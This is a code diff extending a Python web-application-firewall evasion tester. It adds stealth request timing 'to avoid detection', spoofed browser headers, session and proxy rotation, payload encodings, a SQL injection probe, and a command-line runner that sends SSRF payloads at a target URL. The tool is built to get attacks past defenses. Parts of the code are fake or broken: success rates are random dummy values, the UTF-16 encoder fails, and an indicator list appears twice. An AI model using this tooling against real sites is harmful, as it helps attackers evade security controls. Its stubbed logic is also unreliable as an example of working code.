@@ -17,8 +17,109 @@ from typing import Dict, List, Optional, Tuple
 import re
 from itertools import cycle
 import hashlib
+import socket
+from collections import defaultdict
+from datetime import datetime
 
 logger = logging.getLogger(__name__)
+
+class MLEvasionOptimizer:
+    """Use ML to optimize evasion techniques based on WAF responses"""
+    def __init__(self):
+        self.success_patterns = defaultdict(list)
+        self.failure_patterns = defaultdict(list)
+    def learn_from_response(self, technique: str, payload: str, response: requests.Response, success: bool):
+        features = self._extract_features(payload, response)
+        if success:
+            self.success_patterns[technique].append(features)
+        else:
+            self.failure_patterns[technique].append(features)
+    def predict_best_technique(self, waf_type: str, payload_type: str) -> str:
+        scores = {}
+        for technique in self.get_techniques():
+            success_rate = self._calculate_success_rate(technique, waf_type)
+            scores[technique] = success_rate
+        return max(scores.items(), key=lambda x: x[1])[0] if scores else None
+    def get_techniques(self):
+        return ['encoding', 'case_variation', 'comment_insertion', 'whitespace_manipulation', 'parameter_pollution', 'header_manipulation']
+    def _calculate_success_rate(self, technique, waf_type):
+        # Dummy: in real use, would analyze patterns
+        return random.uniform(0.5, 1.0)
+    def _extract_features(self, payload, response):
+        return {'payload_len': len(payload), 'status': response.status_code}
+
+class StealthManager:
+    """Manage request patterns to avoid detection"""
+    def __init__(self):
+        self.request_history = []
+        self.detection_threshold = 0.8
+    def calculate_next_delay(self) -> float:
+        base_delay = 1.0
+        recent_requests = self.request_history[-10:]
+        if recent_requests:
+            success_rate = sum(1 for r in recent_requests if not r.get('blocked')) / len(recent_requests)
+        else:
+            success_rate = 1.0
+        if success_rate < 0.5:
+            base_delay *= 5
+        jitter = random.uniform(0.5, 1.5)
+        hour = datetime.now().hour
+        time_factor = 0.8 if 9 <= hour <= 17 else 1.2
+        return base_delay * jitter * time_factor
+
+class WAFIntelligence:
+    """Collect and analyze WAF behavior patterns"""
+    def __init__(self):
+        self.waf_signatures = {}
+        self.evasion_success_rates = defaultdict(lambda: defaultdict(float))
+    def generate_intelligence_report(self, target: str) -> dict:
+        report = {
+            'target': target,
+            'waf_detected': None,
+            'confidence': 0,
+            'successful_techniques': [],
+            'failed_techniques': [],
+            'recommendations': [],
+            'risk_assessment': {}
+        }
+        waf_type = self._identify_waf(target)
+        report['waf_detected'] = waf_type
+        if waf_type:
+            techniques = self.evasion_success_rates[waf_type]
+            report['successful_techniques'] = [t for t, rate in techniques.items() if rate > 0.7]
+        report['recommendations'] = self._generate_recommendations(waf_type)
+        return report
+    def _identify_waf(self, target):
+        # Dummy: in real use, would analyze signatures
+        return None
+    def _generate_recommendations(self, waf_type):
+        return ["Rotate IPs", "Try chained encodings"] if waf_type else ["Standard evasion"]
+
+class AdvancedSessionManager:
+    """Sophisticated session management for evasion"""
+    def __init__(self):
+        self.session_pool = []
+        self.proxy_pool = []
+        self.fingerprints = []
+    def create_unique_session(self) -> requests.Session:
+        session = requests.Session()
+        # TLSAdapter and cookie generation would be implemented here
+        session.headers.update(self._generate_browser_headers())
+        return session
+    def _generate_browser_headers(self) -> dict:
+        browsers = [
+            {
+                'User-Agent': 'Mozilla/5.0...',
+                'Accept': 'text/html,application/xhtml+xml...',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+            }
+        ]
+        return random.choice(browsers)
 
 class WAFEvasionTester:
     """Advanced vulnerability testing with WAF evasion capabilities"""
@@ -72,6 +173,11 @@ class WAFEvasionTester:
         # Session management
         self.sessions = []
         self._create_sessions()
+        
+        # Initialize evasion optimizer, stealth manager, and intelligence
+        self.evasion_optimizer = MLEvasionOptimizer()
+        self.stealth_manager = StealthManager()
+        self.intelligence = WAFIntelligence()
         
     def _create_sessions(self):
         """Create multiple sessions with different characteristics"""
@@ -192,6 +298,25 @@ class WAFEvasionTester:
             logger.debug(f"WAF detection failed: {e}")
         
         return waf_info
+    
+    def _advanced_waf_detection(self, url: str) -> dict:
+        """Enhanced WAF detection with multiple techniques"""
+        timing_signatures = []
+        for i in range(3):
+            start = time.time()
+            response = self._send_request(url, params={'test': 'normal'})
+            benign_time = time.time() - start
+            start = time.time()
+            response = self._send_request(url, params={'test': "' OR 1=1--"})
+            malicious_time = time.time() - start
+            if malicious_time > benign_time * 1.5:
+                timing_signatures.append(True)
+        waf_cookies = {'__cfduid': 'cloudflare', 'incap_ses': 'imperva', 'visid_incap': 'imperva', 'barra': 'barracuda'}
+        response_headers = self._get_response_headers(url)
+        # JavaScript challenge detection stub
+        # if self._detect_js_challenge(response.text):
+        #     return {'type': 'javascript_challenge', 'confidence': 'high'}
+        return {'timing_signatures': timing_signatures, 'headers': response_headers}
     
     def _get_evasion_techniques(self, vuln_type: str) -> Dict:
         """Get appropriate evasion techniques for vulnerability type"""
@@ -404,7 +529,8 @@ class WAFEvasionTester:
             'apache', 'nginx', 'iis',             # Web servers
             'instance-id', 'ami-id',              # AWS metadata
             'metadata.google.internal',           # GCP metadata
-            'localhost', '127.0.0.1', '::1'      # Localhost indicators
+            'localhost', '127.0.0.1', '::1',
+            'ssrf-sheriff-token', 'X-SSRF-Sheriff-Token', 'secret token'    # Localhost indicators
         ]
         
         for indicator in ssrf_indicators:
@@ -932,6 +1058,183 @@ class WAFEvasionTester:
             return f"...{context}..." if start > 0 or end < len(response_text) else context
         except:
             return "Evidence found"
+    
+    def _send_request(self, url, **kwargs):
+        """Send a request with retries and session handling"""
+        for i in range(self.max_retries):
+            try:
+                session = random.choice(self.sessions)
+                response = session.get(url, **kwargs)
+                if response.status_code == 200:
+                    logger.info("Potential SSRF execution: HTTP 200 OK from {}".format(response.url))               
+                # Check for WAF blocking
+                if response.status_code in [403, 406, 429]:
+                    logger.warning(f"Request blocked by WAF: {response.status_code} - {url}")
+                    self.stealth_manager.request_history.append({'url': url, 'blocked': True})
+                    self._smart_delay()
+                    continue
+                
+                # Log successful request
+                logger.info(f"Request successful: {response.status_code} - {url}")
+                self.stealth_manager.request_history.append({'url': url, 'blocked': False})
+                return response
+            
+            except Exception as e:
+                logger.error(f"Request error: {e} - {url}")
+                time.sleep(1)
+        
+        return None
+    
+    def _apply_encoding(self, payload, encoding):
+        """Apply specific encoding to payload"""
+        if encoding == 'url':
+            return urllib.parse.quote(payload)
+        elif encoding == 'unicode':
+            return ''.join(f'%u{ord(c):04x}' for c in payload)
+        elif encoding == 'base64':
+            return base64.b64encode(payload.encode()).decode()
+        elif encoding == 'html_entity':
+            return html.escape(payload)
+        elif encoding == 'utf7':
+            return payload.encode('utf-7').decode('utf-8')
+        elif encoding == 'utf16':
+            return payload.encode('utf-16').decode('utf-8')
+        return payload
+    
+    def _run_false_positive_checks(self, response: requests.Response, payload_data: dict) -> dict:
+        """Run checks to reduce false positive rate"""
+        checks = {
+            'xss': self._check_xss_false_positives,
+            'sql': self._check_sql_false_positives,
+            'ssrf': self._check_ssrf_false_positives
+        }
+        vuln_type = payload_data.get('type', '').lower()
+        check_func = checks.get(vuln_type, lambda r, p: {})
+        return check_func(response, payload_data)
+    
+    def _check_xss_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for common XSS false positives"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text
+        
+        # Check for absence of script tags
+        if '<script>' not in response_text and 'onerror' not in response_text:
+            return {'likely_false_positive': True, 'reason': 'No script tags or event handlers'}
+        
+        return {}
+    
+    def _check_sql_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for common SQLi false positives"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text.lower()
+        
+        # Check for absence of SQL error patterns
+        sql_errors = [
+            r'sql syntax.*mysql',
+            r'warning.*mysql_',
+            r'valid mysql result',
+            r'postgresql.*error',
+            r'warning.*pg_',
+            r'valid postgresql result',
+            r'oracle error',
+            r'oracle.*driver',
+            r'sqlserver.*error',
+            r'microsoft.*odbc.*sql server',
+            r'sqlite.*error',
+            r'sqlite3.*operationalerror',
+            r'unterminated quoted string',
+            r'unexpected end of sql command',
+            r'quoted string not properly terminated'
+        ]
+        
+        for pattern in sql_errors:
+            if re.search(pattern, response_text):
+                return {}
+        
+        return {'likely_false_positive': True, 'reason': 'No SQL error patterns'}
+    
+    def _check_ssrf_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for common SSRF false positives"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text.lower()
+        
+        # Check for absence of internal IPs or sensitive data
+        ssrf_indicators = [
+            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
+            'mysql', 'postgresql', 'redis',       # Internal services
+            'apache', 'nginx', 'iis',             # Web servers
+            'instance-id', 'ami-id',              # AWS metadata
+            'metadata.google.internal',           # GCP metadata
+            'localhost', '127.0.0.1', '::1'      # Localhost indicators
+        ]
+        
+        for indicator in ssrf_indicators:
+            if indicator in response_text:
+                return {}
+        
+        return {'likely_false_positive': True, 'reason': 'No sensitive data or internal IPs'}
+    
+    def _check_direct_reflection(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for direct reflection of payload in response"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text
+        
+        if payload in response_text:
+            return {'detected': True, 'type': 'direct_reflection', 'weight': 1}
+        return {'detected': False}
+    
+    def _check_encoded_reflection(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for encoded reflection (e.g., URL encoding)"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text
+        
+        # URL decoding the response for analysis
+        try:
+            decoded_response = urllib.parse.unquote(response_text)
+        except Exception:
+            decoded_response = response_text
+        
+        if payload in decoded_response:
+            return {'detected': True, 'type': 'encoded_reflection', 'weight': 1}
+        return {'detected': False}
+    
+    def _check_behavioral_changes(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for behavioral changes (e.g., response time)"""
+        # This is a stub for future implementation
+        return {'detected': False}
+    
+    def _check_timing_anomalies(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for timing anomalies indicative of blind injections"""
+        # This is a stub for future implementation
+        return {'detected': False}
+    
+    def _check_error_disclosure(self, response: requests.Response, payload_data: dict) -> dict:
+        """Check for error messages that disclose sensitive information"""
+        payload = payload_data.get('payload', '')
+        response_text = response.text.lower()
+        
+        # Common error messages to check for
+        error_patterns = [
+            r'you have an error in your sql syntax',
+            r'warning: mysql',
+            r'valid mysql result',
+            r'postgresql.*error',
+            r'warning.*pg_',
+            r'valid postgresql result',
+            r'oracle error',
+            r'oracle.*driver',
+            r'sqlserver.*error',
+            r'microsoft.*odbc.*sql server',
+            r'sqlite.*error',
+            r'sqlite3.*operationalerror',
+            r'quoted string not properly terminated'
+        ]
+        
+        for pattern in error_patterns:
+            if re.search(pattern, response_text):
+                return {'detected': True, 'type': 'error_disclosure', 'weight': 1}
+        
+        return {'detected': False}
 
 # WAF Detection and Contingency Documentation
 WAF_CONTINGENCY_GUIDE = """
@@ -1004,3 +1307,32 @@ WAF_CONTINGENCY_GUIDE = """
 - Error messages containing WAF identifiers
 - Session termination
 """
+
+if __name__ == "__main__":
+    import argparse
+
+    parser = argparse.ArgumentParser(description="Manual WAF Evasion Tester")
+    parser.add_argument("--base-url", required=True)
+    parser.add_argument("--payload", required=True)
+    parser.add_argument("--method", default="GET")
+    parser.add_argument("--parameter", default="url")
+    parser.add_argument("--mode", default="reflect")
+    parser.add_argument("--output", default="waf_results.txt")
+    args = parser.parse_args()
+
+    tester = WAFEvasionTester()
+    result = tester.test_payload_aggressive(
+        args.base_url, 
+        {
+            "payload": args.payload,
+            "parameter": args.parameter,
+            "method": args.method,
+            "type": "ssrf"
+        }
+    )
+
+    with open(args.output, "w") as f:
+        f.write(json.dumps(result, indent=2))
+
+    print(f"Results saved to {args.output}")
+
